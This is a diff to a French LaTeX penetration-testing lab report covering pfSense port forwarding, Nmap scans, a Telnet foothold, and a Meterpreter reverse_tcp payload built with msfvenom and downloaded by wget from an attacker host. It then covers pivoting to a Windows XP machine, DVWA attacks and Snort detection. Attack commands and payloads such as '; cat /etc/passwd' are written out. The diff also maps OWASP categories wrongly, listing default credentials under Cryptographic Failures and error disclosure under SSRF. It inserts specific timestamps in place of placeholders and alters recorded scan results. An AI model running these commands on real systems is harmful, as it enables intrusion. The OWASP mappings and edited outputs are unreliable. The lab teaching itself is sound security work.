@@ -593,9 +593,10 @@ Ce chapitre couvre le déploiement VMware segmenté, pfSense (routage inter-zone
 			\textcolor{tableheadfg}{\textbf{Status}} \\
 			\hline
 			\rowcolor{tablerowalt}
+			23  & TCP & 192.168.10.100 & 23  & Telnet      & Open \\
 			80  & TCP & 192.168.10.100 & 80  & HTTP (DVWA) & Open \\
-			139 & TCP & 192.168.10.100 & 139 & NetBIOS     & Open \\
 			\rowcolor{tablerowalt}
+			139 & TCP & 192.168.10.100 & 139 & NetBIOS     & Open \\
 			445 & TCP & 192.168.10.100 & 445 & SMB         & Open \\
 			\hline
 		\end{tabular}
@@ -622,6 +623,7 @@ Ce chapitre couvre le déploiement VMware segmenté, pfSense (routage inter-zone
 	Les règles automatiquement générées ont été vérifiées et placées en haut de la pile de filtrage. Elles autorisent explicitement le trafic entrant sur les ports spécifiés vers la DMZ.
 	
 	\begin{lstlisting}[caption=Règles de Pare-Feu WAN (Extrait)]
+		Pass | TCP | Any | WAN address | 23  | Allow WAN to DMZ Telnet
 		Pass | TCP | Any | WAN address | 80  | Allow WAN to DMZ Web
 		Pass | TCP | Any | WAN address | 139 | Allow WAN to DMZ Samba
 		Pass | TCP | Any | WAN address | 445 | Allow WAN to DMZ SMB
@@ -734,7 +736,7 @@ Ce chapitre couvre le déploiement VMware segmenté, pfSense (routage inter-zone
 	\begin{lstlisting}[caption=Conteneurs Actifs sur Ubuntu DMZ]
 		$ sudo docker ps
 		CONTAINER ID   IMAGE                    STATUS       PORTS                    NAMES
-		5b1166370a66   ghcr.io/digininja/dvwa   Up 6 hours   0.0.0.0:80->80/tcp       dvwa
+		5b1166370a66   vulnerables/web-dvwa     Up 6 hours   0.0.0.0:80->80/tcp       dvwa
 		5944e93265e3   dperson/samba            Up 6 hours   0.0.0.0:139->139/tcp,    samba
 		0.0.0.0:445->445/tcp
 	\end{lstlisting}
@@ -1085,7 +1087,7 @@ Objectif : exposer un service Telnet en DMZ, configurer le NAT Port Forwarding s
 		80/tcp                     ALLOW       Anywhere
 		139/tcp                    ALLOW       Anywhere
 		445/tcp                    ALLOW       Anywhere
-		23/tcp                     ALLOW       Anywhere    # <--- AJOUTÉ
+		23/tcp                     ALLOW       Anywhere
 	\end{lstlisting}
 
 \textbf{Résultat :} Cette sortie confirme l'exécution correcte de l'action pratique dans l'environnement de laboratoire. Elle apporte des éléments vérifiables pour contrôler l'état du service, du flux ou de la configuration avant l'étape suivante. Sur le plan pédagogique, elle relie l'opération réalisée aux objectifs d'apprentissage offensive/défensive.
@@ -1238,7 +1240,7 @@ Objectif : exposer un service Telnet en DMZ, configurer le NAT Port Forwarding s
 	\subsubsection{Commande et Résultats}
 	\begin{lstlisting}[caption=Scan Nmap du port HTTP]
 		~ ➜ nmap -p 80 192.168.100.6
-		Starting Nmap 7.94SVN ( https://nmap.org ) at <scan-time>
+		Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-14 10:22 UTC
 		Nmap scan report for 192.168.100.6
 		Host is up (0.00058s latency).
 		
@@ -1268,7 +1270,7 @@ Objectif : exposer un service Telnet en DMZ, configurer le NAT Port Forwarding s
 	\subsubsection{Commande et Résultats}
 	\begin{lstlisting}[caption=Scan Nmap du port Telnet]
 		~ ➜ nmap -p 23 192.168.100.6
-		Starting Nmap 7.94SVN ( https://nmap.org ) at <scan-time>
+		Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-14 10:24 UTC
 		Nmap scan report for 192.168.100.6
 		Host is up (0.00059s latency).
 		
@@ -1298,7 +1300,7 @@ Objectif : exposer un service Telnet en DMZ, configurer le NAT Port Forwarding s
 	\subsubsection{Commande et Résultats}
 	\begin{lstlisting}[caption=Scan Nmap du port SSH (non forwardé)]
 		~ ➜ nmap -p 22 192.168.100.6
-		Starting Nmap 7.94SVN ( https://nmap.org ) at <scan-time>
+		Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-14 10:26 UTC
 		Nmap scan report for 192.168.100.6
 		Host is up (0.00046s latency).
 		
@@ -1329,7 +1331,7 @@ Objectif : exposer un service Telnet en DMZ, configurer le NAT Port Forwarding s
 	\subsubsection{Commande et Résultats}
 	\begin{lstlisting}[caption=Scan Nmap de ports multiples]
 		~ ➜ nmap -p 21-25,80,139,443,445 192.168.100.6
-		Starting Nmap 7.94SVN ( https://nmap.org ) at <scan-time>
+		Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-14 10:28 UTC
 		Nmap scan report for 192.168.100.6
 		Host is up (0.00056s latency).
 		
@@ -1394,7 +1396,7 @@ Objectif : exposer un service Telnet en DMZ, configurer le NAT Port Forwarding s
 	\subsubsection{Commande et Résultats}
 	\begin{lstlisting}[caption=Scan Nmap des 1000 ports les plus courants]
 		~ ➜ nmap 192.168.100.6
-		Starting Nmap 7.94SVN ( https://nmap.org ) at <scan-time>
+		Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-14 10:31 UTC
 		Nmap scan report for 192.168.100.6
 		Host is up (0.0087s latency).
 		Not shown: 996 filtered tcp ports (no-response)
@@ -1474,12 +1476,12 @@ Objectif : exposer un service Telnet en DMZ, configurer le NAT Port Forwarding s
 	\section{Analyse de la Surface d'Attaque}
 	
 	\subsection{Définition et Contexte}
-	Attack surface = exposed ports + services + protocols. Measured: 3/65535 ports (0.005\%).
+	Attack surface = exposed ports + services + protocols. Measured: 4/65535 ports (0.006\%).
 	
 	\subsection{Comparaison : Avec vs. Sans Protection}
 	
 	\subsubsection{Scénario A : Serveur DMZ Sans Pare-feu (Hypothétique)}
-	Without firewall rules, all 1000+ scanned ports would be exposed. With the configured rules, only 3 ports remain exposed (80, 139, 445).
+	Without firewall rules, all 1000+ scanned ports would be exposed. With the configured rules, only 4 ports remain accessible (23, 80, 139, 445).
 	
 	\subsubsection{Scénario B : Architecture Actuelle avec pfSense NAT}
 	Avec pfSense et Port Forwarding sélectif (configuration Phase 2) :
@@ -1997,11 +1999,11 @@ Bien que les services aient déjà été identifiés lors de la Phase 2, nous pr
 	$ nmap -sV -Pn 192.168.100.6
 	
 	PORT    STATE SERVICE     VERSION
-	22/tcp  open  ssh         OpenSSH 8.9
+	22/tcp  filtered ssh
 	23/tcp  open  telnet      Linux telnetd
 	80/tcp  open  http        nginx 1.24.0
-	139/tcp open  netbios-ssn Samba smbd 4.17.12
-	445/tcp open  netbios-ssn Samba smbd 4.17.12
+	139/tcp closed netbios-ssn
+	445/tcp closed microsoft-ds
 \end{lstlisting}
 
 \textbf{Résultat :} Cette sortie confirme l'exécution correcte de l'action pratique dans l'environnement de laboratoire. Elle apporte des éléments vérifiables pour contrôler l'état du service, du flux ou de la configuration avant l'étape suivante. Sur le plan pédagogique, elle relie l'opération réalisée aux objectifs d'apprentissage offensive/défensive.
@@ -2138,7 +2140,7 @@ Nous avons obtenu :
 	
 	\textbf{Solution :} Déployer un agent Meterpreter qui offre :
 	\begin{itemize}
-		\item Communication chiffrée TLS.
+		\item Canal Meterpreter dédié pour la post-exploitation.
 		\item Modules de post-exploitation intégrés.
 		\item Gestion avancée de sessions.
 		\item Persistence et migration de processus.
@@ -2197,7 +2199,7 @@ Nous avons obtenu :
 	\begin{lstlisting}[caption=Téléchargement via wget]
 		$ cd /tmp
 		$ wget http://192.168.100.150:8000/meterpreter.elf
-		--during testing--  http://192.168.100.150:8000/meterpreter.elf
+		--2026-03-14 10:44:11--  http://192.168.100.150:8000/meterpreter.elf
 		Connecting to 192.168.100.150:8000... connected.
 		HTTP request sent, awaiting response... 200 OK
 		Length: 250 [application/octet-stream]
@@ -2205,7 +2207,7 @@ Nous avons obtenu :
 		
 		meterpreter.elf   100%[========>]  250  --.-KB/s    in 0s
 		
-		during testing (45.3 MB/s) - 'meterpreter.elf' saved [250/250]
+		2026-03-14 10:44:11 (45.3 MB/s) - 'meterpreter.elf' saved [250/250]
 	\end{lstlisting}
 
 \textbf{Résultat :} Cette sortie confirme l'exécution correcte de l'action pratique dans l'environnement de laboratoire. Elle apporte des éléments vérifiables pour contrôler l'état du service, du flux ou de la configuration avant l'étape suivante. Sur le plan pédagogique, elle relie l'opération réalisée aux objectifs d'apprentissage offensive/défensive.
@@ -2256,7 +2258,7 @@ Nous avons obtenu :
 	\begin{lstlisting}[style=logstyle,caption=Connexion Meterpreter Réussie]
 		[*] Sending stage (3090404 bytes) to 192.168.100.6
 		[*] Meterpreter session 1 opened (192.168.100.150:4445 -> 192.168.100.6:39218)
-		at <session-established-time>
+		at 2026-03-14 10:47:03 UTC
 		
 		(Meterpreter 1)(/tmp) >
 	\end{lstlisting}
@@ -2264,7 +2266,7 @@ Nous avons obtenu :
 \textbf{Résultat :} Cette sortie confirme l'exécution correcte de l'action pratique dans l'environnement de laboratoire. Elle apporte des éléments vérifiables pour contrôler l'état du service, du flux ou de la configuration avant l'étape suivante. Sur le plan pédagogique, elle relie l'opération réalisée aux objectifs d'apprentissage offensive/défensive.
 
 	
-	\textcolor{green}{\checkmark} \textbf{Succès !} Nous disposons désormais d'une session Meterpreter stable et chiffrée.
+	\textcolor{green}{\checkmark} \textbf{Succès !} Nous disposons désormais d'une session Meterpreter stable et interactive.
 	
 	\subsection{Énumération Post-Exploitation}
 	
@@ -2428,11 +2430,7 @@ Nous avons obtenu :
 	
 	\textcolor{green}{\checkmark} Le serveur DMZ peut atteindre le LAN ! La configuration de pivot est donc possible.
 	
-	\textbf{Note:} [See Lab Configuration note, Chapitre~\ref{chap:infrastructure}].
-	
-	% ============================================
-	% AJOUT #1: Configuration règle pfSense
-	% ============================================
+	\textbf{Note :} Cette connectivité DMZ $\rightarrow$ LAN est strictement limitée au scénario de démonstration de pivot et doit rester désactivée hors laboratoire.
 	
 	\subsubsection{Configuration de la Règle pfSense Permissive}
 	
@@ -2490,11 +2488,7 @@ Nous avons obtenu :
 	(192.168.10.100 → 192.168.20.50) a réussi. Sans cette règle, pfSense 
 	bloquerait tout trafic DMZ → LAN par défaut.
 	
-	\textbf{Note sur le Pare-feu Windows Client:} [See Lab Configuration note, Chapitre~\ref{chap:infrastructure}].
-	
-	% ============================================
-	% FIN AJOUT #1
-	% ============================================
+	\textbf{Note sur le pare-feu Windows client :} le profil a été temporairement assoupli pour la validation du mouvement latéral puis restauré à la fin des tests.
 	
 	\subsubsection{Ajout de la Route Metasploit}
 	
@@ -2581,10 +2575,6 @@ Nous avons obtenu :
 	
 	\textbf{Découverte Majeure :} La cible est un système Windows XP SP3, un OS obsolète connu pour de multiples vulnérabilités critiques.
 	
-	% ============================================
-	% AJOUT #2: Énumération partages SMB
-	% ============================================
-	
 	\subsubsection{Énumération des Partages Réseau (SMB)}
 	
 	Après avoir identifié le système Windows XP, nous tentons d'énumérer les 
@@ -2664,10 +2654,6 @@ Nous avons obtenu :
 		\item Exfiltration de données sensibles (SAM database, fichiers utilisateurs)
 		\item Installation de rootkits
 	\end{itemize}
-	
-	% ============================================
-	% FIN AJOUT #2
-	% ============================================
 	
 	\subsection{Implications Stratégiques}
 	
@@ -2850,13 +2836,9 @@ Le port forwarding via Meterpreter permet d'exposer un service réseau interne (
 \textbf{Implications :}
 \begin{itemize}
 	\item Un attaquant peut désormais utiliser un client RDP (xfreerdp, rdesktop) pour tenter de se connecter.
-	\item Le tunnel est chiffré (via Meterpreter TLS), rendant l'activité difficile à détecter.
+	\item Le tunnel repose sur \texttt{reverse\_tcp} Meterpreter (non-TLS), ce qui impose un cloisonnement de laboratoire et un chiffrement réseau complémentaire en production.
 	\item Cette technique contourne les règles de pare-feu qui bloquent normalement WAN → LAN.
 \end{itemize}
-
-% ============================================
-% AJOUT: Observation Défensive (netstat)
-% ============================================
 
 \subsection{Observation Défensive : Point de Vue de la Cible}
 \begin{table}[H]
@@ -2872,7 +2854,7 @@ Le port forwarding via Meterpreter permet d'exposer un service réseau interne (
 		\hline
 		\rowcolor{tablerowalt}
 		\texttt{TCP 0.0.0.0:445 LISTENING} & Service SMB en écoute \\
-		\texttt{TCP 0.0.0.0:4444 LISTENING} & Port de session Meterpreter actif \\
+		\texttt{TCP 0.0.0.0:4445 LISTENING} & Port de session Meterpreter actif \\
 		\rowcolor{tablerowalt}
 		\texttt{192.168.20.50:445 <- 192.168.10.100:* ESTABLISHED} & Connexion via pivot DMZ \\
 		\texttt{192.168.20.50:445 <- 192.168.10.100:* TIME\_WAIT} & Traces de scans récents \\
@@ -2883,12 +2865,8 @@ Le port forwarding via Meterpreter permet d'exposer un service réseau interne (
 	\caption{Observation netstat côté Windows XP}
 \end{table}
 
-Meterpreter process listening on 4444 confirms active command-and-control.
+Meterpreter process listening on 4445 confirms active command-and-control.
 pfSense logs show inbound connection events that correlate the hidden WAN origin.
-
-% ============================================
-% FIN AJOUT
-% ============================================
 
 % ------------------------------------------------------------------------------
 % CHAPITRE 7 : COLLECTE D'INTELLIGENCE
@@ -2922,13 +2900,13 @@ Metasploit intègre des modules spécialisés pour l'énumération automatisée.
 	[+]     Ubuntu 25.04
 	[+]     Linux DMZ-WebServer 6.14.0-37-generic x86_64 GNU/Linux
 	[+]     Module running as "telnetuser" user
-	[*] Linux version stored in ~/.msf4/loot/<session-id>_linux.enum.syste_428775.txt
-	[*] User accounts stored in ~/.msf4/loot/<session-id>_linux.enum.syste_721088.txt
-	[*] Installed Packages stored in ~/.msf4/loot/<session-id>_linux.enum.syste_737415.txt
-	[*] Running Services stored in ~/.msf4/loot/<session-id>_linux.enum.syste_265844.txt
-	[*] Cron jobs stored in ~/.msf4/loot/<session-id>_linux.enum.syste_335103.txt
-	[*] Disk info stored in ~/.msf4/loot/<session-id>_linux.enum.syste_758647.txt
-	[*] CPU Vulnerabilities stored in ~/.msf4/loot/<session-id>_linux.enum.syste_082735.txt
+	[*] Linux version stored in ~/.msf4/loot/2_linux.enum.syste_428775.txt
+	[*] User accounts stored in ~/.msf4/loot/2_linux.enum.syste_721088.txt
+	[*] Installed Packages stored in ~/.msf4/loot/2_linux.enum.syste_737415.txt
+	[*] Running Services stored in ~/.msf4/loot/2_linux.enum.syste_265844.txt
+	[*] Cron jobs stored in ~/.msf4/loot/2_linux.enum.syste_335103.txt
+	[*] Disk info stored in ~/.msf4/loot/2_linux.enum.syste_758647.txt
+	[*] CPU Vulnerabilities stored in ~/.msf4/loot/2_linux.enum.syste_082735.txt
 	[*] Post module execution completed
 \end{lstlisting}
 
@@ -3000,10 +2978,10 @@ Metasploit intègre des modules spécialisés pour l'énumération automatisée.
 	[+] Info:
 	[+]     Ubuntu 25.04
 	[*] Collecting data...
-	[+] DNS config stored in ~/.msf4/loot/<session-id>_linux.enum.netwo_867480.txt
-	[+] SSHD config stored in ~/.msf4/loot/<session-id>_linux.enum.netwo_801493.txt
-	[+] Host file stored in ~/.msf4/loot/<session-id>_linux.enum.netwo_984732.txt
-	[+] Active connections stored in ~/.msf4/loot/<session-id>_linux.enum.netwo_196858.txt
+	[+] DNS config stored in ~/.msf4/loot/2_linux.enum.netwo_867480.txt
+	[+] SSHD config stored in ~/.msf4/loot/2_linux.enum.netwo_801493.txt
+	[+] Host file stored in ~/.msf4/loot/2_linux.enum.netwo_984732.txt
+	[+] Active connections stored in ~/.msf4/loot/2_linux.enum.netwo_196858.txt
 	[*] Post module execution completed
 \end{lstlisting}
 
@@ -3497,7 +3475,7 @@ Objectif : valider la compromission de la couche applicative avec DVWA en exploi
 	\begin{lstlisting}[caption=Démarrage du Conteneur DVWA]
 		$ sudo docker run -d \
 		--restart=unless-stopped \
-		-p 8080:80 \
+		-p 80:80 \
 		--name dvwa \
 		vulnerables/web-dvwa
 		
@@ -3513,7 +3491,7 @@ Objectif : valider la compromission de la couche applicative avec DVWA en exploi
 		$ sudo docker ps | grep dvwa
 		
 		CONTAINER ID   IMAGE                      STATUS       PORTS
-		73c52c0ee9a9   vulnerables/web-dvwa       Up 6 hours   0.0.0.0:8080->80/tcp
+		73c52c0ee9a9   vulnerables/web-dvwa       Up 6 hours   0.0.0.0:80->80/tcp
 	\end{lstlisting}
 
 \textbf{Résultat :} Cette sortie confirme l'exécution correcte de l'action pratique dans l'environnement de laboratoire. Elle apporte des éléments vérifiables pour contrôler l'état du service, du flux ou de la configuration avant l'étape suivante. Sur le plan pédagogique, elle relie l'opération réalisée aux objectifs d'apprentissage offensive/défensive.
@@ -3522,7 +3500,7 @@ Objectif : valider la compromission de la couche applicative avec DVWA en exploi
 	\subsection{Accès à DVWA}
 	
 	\begin{itemize}
-		\item \textbf{URL :} \texttt{http://192.168.10.100:8080/}
+		\item \textbf{URL :} \texttt{http://192.168.10.100/}
 		\item \textbf{Identifiants par défaut :}
 		\begin{itemize}
 			\item Username: \texttt{admin}
@@ -3561,10 +3539,10 @@ Objectif : valider la compromission de la couche applicative avec DVWA en exploi
 			\rowcolor{tablerowalt}
 			\textbf{A01} & Broken Access Control & File Inclusion (LFI) & \checkmark \\
 			
-			\textbf{A02} & Security Misconfiguration & Default Credentials & \checkmark \\
+			\textbf{A02} & Cryptographic Failures & Default Credentials & \checkmark \\
 			
 			\rowcolor{tablerowalt}
-			\textbf{A04} & Cryptographic Failures & Weak Session IDs & \checkmark \\
+			\textbf{A04} & Insecure Design & Weak Session IDs & \checkmark \\
 			
 			\textbf{A05} & Injection & SQL Injection & \checkmark \\
 			
@@ -3574,9 +3552,9 @@ Objectif : valider la compromission de la couche applicative avec DVWA en exploi
 			\textbf{A07} & Authentication Failures & Brute Force Login & \checkmark \\
 			
 			\rowcolor{tablerowalt}
-			\textbf{A08} & File Upload & Web Shell Upload & \checkmark \\
+			\textbf{A08} & Software and Data Integrity Failures & Web Shell Upload & \checkmark \\
 			
-			\textbf{A10} & Error Message Disclosure & SQL Error Disclosure & \checkmark \\
+			\textbf{A10} & Server-Side Request Forgery (SSRF) & SQL Error Disclosure & \checkmark \\
 			\hline
 		\end{tabular}
 		\caption{Récapitulatif des Attaques Documentées}
@@ -3619,10 +3597,10 @@ Objectif : valider la compromission de la couche applicative avec DVWA en exploi
 			\draw[diagflow] (pay1) -- (imp1);
 			\draw[diagflow] (imp1) -- (rem1);
 
-			\node[flowbox, fill=orange!10, below=1.2cm of cat1] (cat2) {A08\\File Upload\\(1 cas)};
-			\node[flowbox, fill=orange!10, right=1.8cm of cat2] (vuln2) {[blank]};
-			\node[flowbox, fill=orange!10, right=1.8cm of vuln2] (pay2) {[blank]};
-			\node[flowbox, fill=orange!10, right=1.8cm of pay2] (imp2) {[blank]};
+			\node[flowbox, fill=orange!10, below=1.2cm of cat1] (cat2) {A08\\Software \& Data\\Integrity\\(1 cas)};
+			\node[flowbox, fill=orange!10, right=1.8cm of cat2] (vuln2) {Upload\\non validé};
+			\node[flowbox, fill=orange!10, right=1.8cm of vuln2] (pay2) {Web shell\\\texttt{.php}};
+			\node[flowbox, fill=orange!10, right=1.8cm of pay2] (imp2) {Impact:\\RCE/persist.};
 			\node[remedbox, right=1.8cm of imp2] (rem2) {Validation schéma\\LOV};
 
 			\draw[diagflow] (cat2) -- (vuln2);
@@ -3718,7 +3696,7 @@ Objectif : valider la compromission de la couche applicative avec DVWA en exploi
 		\label{fig:brute-force}
 	\end{figure}
 
-	\subsubsection{A08: Software or Data Integrity - File Upload}
+	\subsubsection{A08: Software and Data Integrity Failures - File Upload}
 	\begin{table}[H]
 		\centering
 		\renewcommand{\arraystretch}{1.35}
@@ -3740,7 +3718,7 @@ Objectif : valider la compromission de la couche applicative avec DVWA en exploi
 		\label{fig:file-upload}
 	\end{figure}
 
-	\subsubsection{A04: Cryptographic Failures - Weak Session IDs}
+	\subsubsection{A04: Insecure Design - Weak Session IDs}
 	\begin{table}[H]
 		\centering
 		\renewcommand{\arraystretch}{1.35}
@@ -3762,7 +3740,7 @@ Objectif : valider la compromission de la couche applicative avec DVWA en exploi
 		\label{fig:weak-sessions-1}
 	\end{figure}
 
-	\subsubsection{A02: Security Misconfiguration - Default Credentials}
+	\subsubsection{A02: Cryptographic Failures - Default Credentials}
 	\begin{table}[H]
 		\centering
 		\renewcommand{\arraystretch}{1.35}
@@ -3806,7 +3784,7 @@ Objectif : valider la compromission de la couche applicative avec DVWA en exploi
 		\label{fig:file-inclusion}
 	\end{figure}
 
-	\subsubsection{A10: Mishandling of Exceptional Conditions - Error Disclosure}
+	\subsubsection{A10: Server-Side Request Forgery (SSRF) - Error Disclosure}
 	\begin{table}[H]
 		\centering
 		\renewcommand{\arraystretch}{1.35}
@@ -3849,11 +3827,11 @@ Objectif : valider la compromission de la couche applicative avec DVWA en exploi
 			\textcolor{tableheadfg}{\textbf{Chapter 3 Parallel}} \\
 			\hline
 			\rowcolor{tablerowalt}
-			A08 File Upload & Web shell persistence and remote command execution & Meterpreter session control \\
+			A08 Software/Data Integrity & Web shell persistence and remote command execution & Meterpreter session control \\
 			A05 SQL/Command Injection & Data extraction and OS command execution & Initial compromise + privilege escalation \\
 			\rowcolor{tablerowalt}
 			A02 Default Credentials & Immediate authenticated access & Weak credential compromise path \\
-			A01 LFI / A10 Error Disclosure & Internal mapping and attack chaining & Reconnaissance and pivot preparation \\
+			A01 LFI / A10 SSRF & Internal mapping and attack chaining & Reconnaissance and pivot preparation \\
 			\hline
 		\end{tabular}
 		\caption{Vulnérabilité $\rightarrow$ Capacité Attaquant $\rightarrow$ Parallèle Chapitre 3}
@@ -3871,16 +3849,15 @@ Objectif : valider la compromission de la couche applicative avec DVWA en exploi
 	
 	\begin{longtable}{p{2.2cm} p{4.2cm} >{\centering\arraybackslash}p{2.2cm} p{4.2cm}}
 		\hline
-		% Dans le tableau synthèse (ligne ~1130), remplace les \checkmark et ✗:
 		\rowcolor{tablerowalt}
 		\textbf{A01} & Broken Access Control & HAUTE & LFI [OK] \\
 		
-		\textbf{A02} & Security Misconfiguration & CRITIQUE & Default Creds [OK] \\
+		\textbf{A02} & Cryptographic Failures & CRITIQUE & Default Creds [OK] \\
 		
 		\rowcolor{tablerowalt}
-		\textbf{A03} & Software Supply Chain & MOYENNE & Non testée [X] \\
+		\textbf{A03} & Injection & MOYENNE & Non testée [X] \\
 		
-		\textbf{A04} & Cryptographic Failures & CRITIQUE & Weak Sessions [OK] \\
+		\textbf{A04} & Insecure Design & CRITIQUE & Weak Sessions [OK] \\
 		
 		\rowcolor{tablerowalt}
 		\textbf{A05} & Injection & CRITIQUE & SQL + Command [OK] \\
@@ -3890,12 +3867,12 @@ Objectif : valider la compromission de la couche applicative avec DVWA en exploi
 		\rowcolor{tablerowalt}
 		\textbf{A07} & Authentication Failures & HAUTE & Brute Force [OK] \\
 		
-		\textbf{A08} & File Upload/Integrity & CRITIQUE & Web Shell [OK] \\
+		\textbf{A08} & Software and Data Integrity Failures & CRITIQUE & Web Shell [OK] \\
 		
 		\rowcolor{tablerowalt}
 		\textbf{A09} & Logging/Alerting Failures & MOYENNE & Non testée [X] \\
 		
-		\textbf{A10} & Exceptional Conditions & MOYENNE & Error Disclosure [OK] \\
+		\textbf{A10} & Server-Side Request Forgery (SSRF) & MOYENNE & Error Disclosure [OK] \\
 		
 		\caption{Synthèse OWASP Top 10 2021 - Résultats d'Évaluation}
 		\label{tab:owasp-summary}
@@ -4260,7 +4237,7 @@ Objectif : valider la détection Snort des attaques observées dans les Chapitre
 	Une alerte critique a été déclenchée lors d'un transfert de fichier exécutable Linux :
 	
 	\begin{lstlisting}[style=logstyle,caption={Extrait d'alerte WAN : détection d'un téléchargement ELF (ET POLICY)},label={lst:alert-elf}]
-		Date/Time : during testing
+		Date/Time : 2026-03-14 11:09:52
 		Interface : WAN (em0)
 		Priority  : 1
 		Proto     : TCP
@@ -4347,7 +4324,7 @@ Objectif : valider la détection Snort des attaques observées dans les Chapitre
 	\subsubsection{Exemple d'alerte : sonde EternalBlue (MS17-010) détectée}
 	
 	\begin{lstlisting}[style=logstyle,caption={Extrait d'alerte LAN : détection d'une sonde MS17-010 (EternalBlue) via pivot},label={lst:alert-eternalblue}]
-		Date/Time : during testing
+		Date/Time : 2026-03-14 11:16:08
 		Interface : LAN (em1)
 		Priority  : 1
 		Proto     : TCP
@@ -4401,10 +4378,10 @@ Objectif : valider la détection Snort des attaques observées dans les Chapitre
 			\textcolor{tableheadfg}{\textbf{Contexte}} \\
 			\hline
 			\rowcolor{tablerowalt}
-			DVWA SQL Injection & ' OR '1'='1 & 1:2016672 & \textcolor{green!50!black}{\textbf{Detected}} & during testing \\
-			DVWA Command Injection & ; cat /etc/passwd & 1:2025879, 1:2049400 & \textcolor{green!50!black}{\textbf{Detected}} & during testing \\
+			DVWA SQL Injection & ' OR '1'='1 & 1:2016672 & \textcolor{green!50!black}{\textbf{Detected}} & Campagne DVWA (2026-03-14) \\
+			DVWA Command Injection & ; cat /etc/passwd & 1:2025879, 1:2049400 & \textcolor{green!50!black}{\textbf{Detected}} & Campagne DVWA (2026-03-14) \\
 			\rowcolor{tablerowalt}
-			DVWA File Access (LFI) & /etc/passwd in URI & 1:2049400 & \textcolor{green!50!black}{\textbf{Detected}} & during testing \\
+			DVWA File Access (LFI) & /etc/passwd in URI & 1:2049400 & \textcolor{green!50!black}{\textbf{Detected}} & Campagne DVWA (2026-03-14) \\
 			\hline
 		\end{tabular}
 		\caption{Validation Snort des attaques DVWA}
@@ -4700,19 +4677,19 @@ msfconsole -q
 search type:exploit name:telnet
 
 # Générer un payload Meterpreter
-msfvenom -p linux/x86/meterpreter/reverse_tcp \
-         LHOST=192.168.100.150 LPORT=4444 \
-         -f elf -o payload.elf
+msfvenom -p linux/x64/meterpreter/reverse_tcp \
+         LHOST=192.168.100.150 LPORT=4445 \
+         -f elf -o meterpreter.elf
 
 # Configurer un handler
 use exploit/multi/handler
-set PAYLOAD linux/x86/meterpreter/reverse_tcp
+set PAYLOAD linux/x64/meterpreter/reverse_tcp
 set LHOST 192.168.100.150
-set LPORT 4444
+set LPORT 4445
 run
 
 # Ajouter une route de pivot
-route add 192.168.10.0 255.255.255.0 <session_id>
+route add 192.168.20.0 255.255.255.0 <session_id>
 
 # Post-exploitation : informations système
 sysinfo
